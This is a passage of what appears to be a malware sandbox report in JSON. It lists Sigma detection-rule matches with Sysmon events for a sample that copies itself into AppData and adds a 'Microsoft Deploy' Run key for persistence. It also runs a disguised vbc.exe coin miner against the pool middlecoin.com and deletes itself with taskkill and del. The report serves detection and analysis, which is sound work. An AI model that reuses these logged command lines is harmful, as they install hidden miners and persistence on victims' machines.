                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-6573-638F-860A-000000004700}",
                                "ProcessId": "2388",
                                "Product": "Microsoft\\xae Visual Studio\\xae 2005",
                                "Description": "Visual Basic Command Line Compiler",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-656E-638F-7E0A-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=C63ED21D5706A527419C9FBD730FFB2E,SHA256=EDC4DE60FDC6757EC01BFC86B1E3B54398F5E01D31E881AEBDFB5CC945629E80,IMPHASH=5B989C7F24F9B07840E9A2A654544C93",
                                "OriginalFileName": "vbc.exe",
                                "ParentImage": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\cvtres.exe",
                                "FileVersion": "8.0.50727.8922",
                                "ParentProcessId": "2592",
                                "CurrentDirectory": "C:\\Users\\george\\AppData\\Roaming\\",
                                "CommandLine": "\"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe\" --scrypt -o stratum+tcp://middlecoin.com:3333 -u 1NHH8wDYbJK4jWzvZoAZVKdvdJPDDgBAsP -p x -I d",
                                "EventID": "1",
                                "LogonGuid": "C784477D-FE75-6385-9A83-040000000000",
                                "LogonId": "295834",
                                "Image": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\cvtres.exe\"",
                                "UtcTime": "1670342003",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-657C-638F-910A-000000004700}",
                                "ProcessId": "252",
                                "Product": "Microsoft\\xae Visual Studio\\xae 2005",
                                "Description": "Visual Basic Command Line Compiler",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-6576-638F-890A-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=C63ED21D5706A527419C9FBD730FFB2E,SHA256=EDC4DE60FDC6757EC01BFC86B1E3B54398F5E01D31E881AEBDFB5CC945629E80,IMPHASH=5B989C7F24F9B07840E9A2A654544C93",
                                "OriginalFileName": "vbc.exe",
                                "ParentImage": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\cvtres.exe",
                                "FileVersion": "8.0.50727.8922",
                                "ParentProcessId": "2980",
                                "CurrentDirectory": "C:\\Users\\george\\AppData\\Roaming\\",
                                "CommandLine": "\"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe\" --scrypt -o stratum+tcp://middlecoin.com:3333 -u 1NHH8wDYbJK4jWzvZoAZVKdvdJPDDgBAsP -p x -I d",
                                "EventID": "1",
                                "LogonGuid": "C784477D-FE75-6385-9A83-040000000000",
                                "LogonId": "295834",
                                "Image": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\cvtres.exe\"",
                                "UtcTime": "1670342012",
                                "RuleName": "-"
                            }
                        }
                    ]
                },
                {
                    "rule_level": "medium",
                    "rule_id": "8b5db9da5732dc549b0e8b56fe5933d7c95ed760f3ac20568ab95347ef8c5bcc",
                    "rule_source": "Sigma Integrated Rule Set (GitHub)",
                    "rule_title": "CurrentVersion Autorun Keys Modification",
                    "rule_description": "Detects modification of autostart extensibility point (ASEP) in registry.",
                    "rule_author": "Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split)",
                    "match_context": [
                        {
                            "values": {
                                "EventID": "13",
                                "ProcessId": "6312",
                                "EventType": "SetValue",
                                "Image": "C:\\Windows\\SysWOW64\\reg.exe",
                                "RuleName": "T1060,RunKey",
                                "UtcTime": "1670341986",
                                "Details": "C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe",
                                "ProcessGuid": "{C784477D-6562-638F-730A-000000004700}",
                                "TargetObject": "HKU\\S-1-5-21-1015118539-3749460369-599379286-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Microsoft Deploy"
                            }
                        },
                        {
                            "values": {
                                "EventID": "13",
                                "ProcessId": "6580",
                                "EventType": "SetValue",
                                "Image": "C:\\Windows\\SysWOW64\\reg.exe",
                                "RuleName": "T1060,RunKey",
                                "UtcTime": "1670342001",
                                "Details": "C:\\Users\\george\\AppData\\Roaming\\mCggnszw.exe",
                                "ProcessGuid": "{C784477D-6570-638F-810A-000000004700}",
                                "TargetObject": "HKU\\S-1-5-21-1015118539-3749460369-599379286-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Microsoft Deploy"
                            }
                        },
                        {
                            "values": {
                                "EventID": "13",
                                "ProcessId": "3056",
                                "EventType": "SetValue",
                                "Image": "C:\\Windows\\SysWOW64\\reg.exe",
                                "ProcessGuid": "{C784477D-6579-638F-8C0A-000000004700}",
                                "UtcTime": "1670342010",
                                "Details": "C:\\Users\\george\\AppData\\Roaming\\wswHafRT.exe",
                                "RuleName": "T1060,RunKey",
                                "TargetObject": "HKU\\S-1-5-21-1015118539-3749460369-599379286-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Microsoft Deploy"
                            }
                        },
                        {
                            "values": {
                                "Details": "C:\\Users\\Administrator\\AppData\\Roaming\\aDJOEHPE.exe",
                                "EventType": "SetValue",
                                "EventID": "13",
                                "TargetObject": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Microsoft Deploy"
                            }
                        }
                    ]
                },
                {
                    "rule_level": "medium",
                    "rule_id": "aa87efb252a9cf7bb1fb0114336bd08c338bc9046dd498d187c209cd94ddbc6a",
                    "rule_source": "Sigma Integrated Rule Set (GitHub)",
                    "rule_title": "Potential Persistence Attempt Via Run Keys Using Reg.EXE",
                    "rule_description": "Detects suspicious command line reg.exe tool adding key to RUN key in Registry",
                    "rule_author": "Florian Roth (Nextron Systems)",
                    "match_context": [
                        {
                            "values": {
                                "CommandLine": "\"cmd.exe\" /c reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /f /v \"Microsoft Deploy\" /t REG_SZ /d \"C:\\Users\\Administrator\\AppData\\Roaming\\aDJOEHPE.exe",
                                "Image": "cmd.exe",
                                "EventID": "1"
                            }
                        },
                        {
                            "values": {
                                "CommandLine": "reg  add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /f /v \"Microsoft Deploy\" /t REG_SZ /d \"C:\\Users\\Administrator\\AppData\\Roaming\\aDJOEHPE.exe",
                                "Image": "reg",
                                "EventID": "1"
                            }
                        }
                    ]
                },
                {
                    "rule_level": "low",
                    "rule_id": "77ed185ff979a8d9206b5eed07bf6d5823529f713ed0ea19f2ef7a4a355568bc",
                    "rule_source": "Sigma Integrated Rule Set (GitHub)",
                    "rule_title": "Windows Cmd Delete File",
                    "rule_description": "Adversaries may delete files left behind by the actions of their intrusion activity.\nMalware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how.\nRemoval of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n",
                    "rule_author": "frack113",
                    "match_context": [
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-6563-638F-740A-000000004700}",
                                "ProcessId": "7048",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Windows Command Processor",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-6558-638F-6D0A-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726",
                                "OriginalFileName": "Cmd.Exe",
                                "ParentImage": "C:\\Users\\george\\Desktop\\software.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "1368",
                                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                                "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /C taskkill /f /im \"software.exe\" & ping -n 1 -w 3000 1.1.1.1 & type nul > \"C:\\Users\\george\\Desktop\\software.exe\" & del /f /q \"C:\\Users\\george\\Desktop\\software.exe\"",
                                "EventID": "1",
                                "LogonGuid": "C784477D-FE75-6385-9A83-040000000000",
                                "LogonId": "295834",
                                "Image": "C:\\Windows\\SysWOW64\\cmd.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Users\\george\\Desktop\\software.exe\"",
                                "UtcTime": "1670341987",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-6571-638F-820A-000000004700}",
                                "ProcessId": "6180",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Windows Command Processor",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-656C-638F-7D0A-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726",
                                "OriginalFileName": "Cmd.Exe",
                                "ParentImage": "C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "1676",
                                "CurrentDirectory": "C:\\Users\\george\\AppData\\Roaming\\",
                                "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /C taskkill /f /im \"uFmfcGzo.exe\" & ping -n 1 -w 3000 1.1.1.1 & type nul > \"C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe\" & del /f /q \"C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe\"",
                                "EventID": "1",
                                "LogonGuid": "C784477D-FE75-6385-9A83-040000000000",
                                "LogonId": "295834",
                                "Image": "C:\\Windows\\SysWOW64\\cmd.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe\" ",
                                "UtcTime": "1670342001",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-657A-638F-8D0A-000000004700}",
                                "ProcessId": "1936",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Windows Command Processor",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-6574-638F-880A-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726",
                                "OriginalFileName": "Cmd.Exe",
                                "ParentImage": "C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "6520",
                                "CurrentDirectory": "C:\\Users\\george\\AppData\\Roaming\\",
                                "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /C taskkill /f /im \"uFmfcGzo.exe\" & ping -n 1 -w 3000 1.1.1.1 & type nul > \"C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe\" & del /f /q \"C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe\"",
                                "EventID": "1",
                                "LogonGuid": "C784477D-FE75-6385-9A83-040000000000",
                                "LogonId": "295834",
                                "Image": "C:\\Windows\\SysWOW64\\cmd.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe\" ",
                                "UtcTime": "1670342010",
                                "RuleName": "-"
                            }
                        }
                    ]
                },
                {
                    "rule_level": "low",
                    "rule_id": "b5386a23355681c43cfbd2f2ccfe4b16ed45324d0d7b5583487a9f302ee1e427",
                    "rule_source": "Sigma Integrated Rule Set (GitHub)",
                    "rule_title": "Creation of an Executable by an Executable",
                    "rule_description": "Detects the creation of an executable by another executable",
                    "rule_author": "frack113",
                    "match_context": [
                        {
                            "values": {
                                "EventID": "11",
                                "ProcessId": "1368",
                                "TargetFilename": "C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe",
                                "ProcessGuid": "{C784477D-6558-638F-6D0A-000000004700}",
                                "CreationUtcTime": "1670341985",
                                "UtcTime": "1670341985",
                                "RuleName": "EXE",
                                "Image": "C:\\Users\\george\\Desktop\\software.exe"
                            }
                        },
                        {
                            "values": {
                                "EventID": "11",
                                "ProcessId": "1676",
                                "TargetFilename": "C:\\Users\\george\\AppData\\Roaming\\mCggnszw.exe",
                                "RuleName": "EXE",
                                "CreationUtcTime": "1670341999",
                                "UtcTime": "1670341999",
                                "ProcessGuid": "{C784477D-656C-638F-7D0A-000000004700}",
                                "Image": "C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe"
                            }
                        },
                        {
                            "values": {
                                "EventID": "11",
                                "ProcessId": "6520",
                                "TargetFilename": "C:\\Users\\george\\AppData\\Roaming\\wswHafRT.exe",
                                "RuleName": "EXE",
                                "CreationUtcTime": "1670342007",
                                "UtcTime": "1670342007",
                                "ProcessGuid": "{C784477D-6574-638F-880A-000000004700}",
                                "Image": "C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe"
                            }
                        }
                    ]
                },
                {
                    "rule_level": "low",
                    "rule_id": "cd06da2f3978bdb24b3f3c8f83c7df917a910c6b29921d0e375e418f340d8f3d",
                    "rule_source": "Sigma Integrated Rule Set (GitHub)",
                    "rule_title": "Suspicious Execution of Taskkill",
                    "rule_description": "Adversaries may stop services or processes in order to conduct Data Destruction or Data Encrypted for Impact on the data stores of services like Exchange and SQL Server.",
                    "rule_author": "frack113",
                    "match_context": [
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-6564-638F-760A-000000004700}",
                                "ProcessId": "3476",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Terminates Processes",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-6563-638F-740A-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=15E2E0ACD891510C6268CB8899F2A1A1,SHA256=F328D587561BEED3C19289FBA43E284FB57BCE1A4C202C7379673964F9B8610D,IMPHASH=0D3E23DCB6BF63A9EB90D5BED57B4F89",
                                "OriginalFileName": "taskkill.exe",
                                "ParentImage": "C:\\Windows\\SysWOW64\\cmd.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "7048",
                                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                                "CommandLine": "taskkill  /f /im \"software.exe\" ",
                                "EventID": "1",
                                "LogonGuid": "C784477D-FE75-6385-9A83-040000000000",
                                "LogonId": "295834",
                                "Image": "C:\\Windows\\SysWOW64\\taskkill.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /C taskkill /f /im \"software.exe\" & ping -n 1 -w 3000 1.1.1.1 & type nul > \"C:\\Users\\george\\Desktop\\software.exe\" & del /f /q \"C:\\Users\\george\\Desktop\\software.exe\"",
                                "UtcTime": "1670341988",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-6572-638F-840A-000000004700}",
                                "ProcessId": "2504",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Terminates Processes",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-6571-638F-820A-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=15E2E0ACD891510C6268CB8899F2A1A1,SHA256=F328D587561BEED3C19289FBA43E284FB57BCE1A4C202C7379673964F9B8610D,IMPHASH=0D3E23DCB6BF63A9EB90D5BED57B4F89",
                                "OriginalFileName": "taskkill.exe",
                                "ParentImage": "C:\\Windows\\SysWOW64\\cmd.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "6180",
                                "CurrentDirectory": "C:\\Users\\george\\AppData\\Roaming\\",
                                "CommandLine": "taskkill  /f /im \"uFmfcGzo.exe\" ",
                                "EventID": "1",
                                "LogonGuid": "C784477D-FE75-6385-9A83-040000000000",
                                "LogonId": "295834",
                                "Image": "C:\\Windows\\SysWOW64\\taskkill.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /C taskkill /f /im \"uFmfcGzo.exe\" & ping -n 1 -w 3000 1.1.1.1 & type nul > \"C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe\" & del /f /q \"C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe\"",
                                "UtcTime": "1670342002",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-657B-638F-8F0A-000000004700}",
                                "ProcessId": "5596",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Terminates Processes",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-657A-638F-8D0A-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=15E2E0ACD891510C6268CB8899F2A1A1,SHA256=F328D587561BEED3C19289FBA43E284FB57BCE1A4C202C7379673964F9B8610D,IMPHASH=0D3E23DCB6BF63A9EB90D5BED57B4F89",
                                "OriginalFileName": "taskkill.exe",
                                "ParentImage": "C:\\Windows\\SysWOW64\\cmd.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "1936",
                                "CurrentDirectory": "C:\\Users\\george\\AppData\\Roaming\\",
                                "CommandLine": "taskkill  /f /im \"uFmfcGzo.exe\" ",
                                "EventID": "1",
                                "LogonGuid": "C784477D-FE75-6385-9A83-040000000000",
                                "LogonId": "295834",
                                "Image": "C:\\Windows\\SysWOW64\\taskkill.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /C taskkill /f /im \"uFmfcGzo.exe\" & ping -n 1 -w 3000 1.1.1.1 & type nul > \"C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe\" & del /f /q \"C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe\"",
                                "UtcTime": "1670342011",
                                "RuleName": "-"
                            }
                        }
                    ]
                },
                {
                    "rule_level": "low",
                    "rule_id": "e77646c39db7fa011a5223aeb73c738046787fc7f62a99394e883d76a54341f7",
                    "rule_source": "Sigma Integrated Rule Set (GitHub)",
                    "rule_title": "Redirect Output in CommandLine",
                    "rule_description": "Use \">\" to redicrect information in commandline",
                    "rule_author": "frack113",
                    "match_context": [
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-6563-638F-740A-000000004700}",
                                "ProcessId": "7048",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Windows Command Processor",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-6558-638F-6D0A-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726",
                                "OriginalFileName": "Cmd.Exe",
                                "ParentImage": "C:\\Users\\george\\Desktop\\software.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "1368",
                                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                                "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /C taskkill /f /im \"software.exe\" & ping -n 1 -w 3000 1.1.1.1 & type nul > \"C:\\Users\\george\\Desktop\\software.exe\" & del /f /q \"C:\\Users\\george\\Desktop\\software.exe\"",
                                "EventID": "1",
                                "LogonGuid": "C784477D-FE75-6385-9A83-040000000000",
                                "LogonId": "295834",
                                "Image": "C:\\Windows\\SysWOW64\\cmd.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Users\\george\\Desktop\\software.exe\"",
                                "UtcTime": "1670341987",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-6571-638F-820A-000000004700}",
                                "ProcessId": "6180",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Windows Command Processor",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-656C-638F-7D0A-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726",
                                "OriginalFileName": "Cmd.Exe",
                                "ParentImage": "C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "1676",
                                "CurrentDirectory": "C:\\Users\\george\\AppData\\Roaming\\",
                                "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /C taskkill /f /im \"uFmfcGzo.exe\" & ping -n 1 -w 3000 1.1.1.1 & type nul > \"C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe\" & del /f /q \"C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe\"",
                                "EventID": "1",
                                "LogonGuid": "C784477D-FE75-6385-9A83-040000000000",
                                "LogonId": "295834",
                                "Image": "C:\\Windows\\SysWOW64\\cmd.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Users\\george\\AppData\\Roaming\\uFmfcGzo.exe\" ",
                                "UtcTime": "1670342001",
                                "RuleName": "-"
                            }
                        },
